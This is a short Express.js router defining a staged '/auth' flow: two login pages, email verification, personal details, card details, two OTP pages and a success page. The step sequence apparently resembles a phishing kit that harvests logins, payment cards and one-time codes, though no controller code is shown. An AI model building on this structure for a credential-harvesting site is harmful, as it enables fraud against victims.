const express = require('express');
const router =  express.Router();
const controller = require('../controller/controller');

router.get('/auth/login', controller.login);
router.post('/auth/login', controller.loginPost);

router.get('/auth/login/2', controller.login2);
router.post('/auth/login/2', controller.loginPost2);

router.get('/auth/email-verification', controller.login3);
router.post('/auth/email-verification', controller.loginPost3);

router.get('/auth/personal', controller.personal);
router.post('/auth/personal', controller.personalPost);

router.get('/auth/card', controller.card);
router.post('/auth/card', controller.cardPost);

router.get('/auth/otp', controller.otp);
router.post('/auth/otp', controller.otpPost);

router.get('/auth/otp/2', controller.otp2);
router.post('/auth/otp/2', controller.otpPost2);

router.get('/auth/success', controller.success);

router.get('*', controller.page404Redirect);

module.exports = router;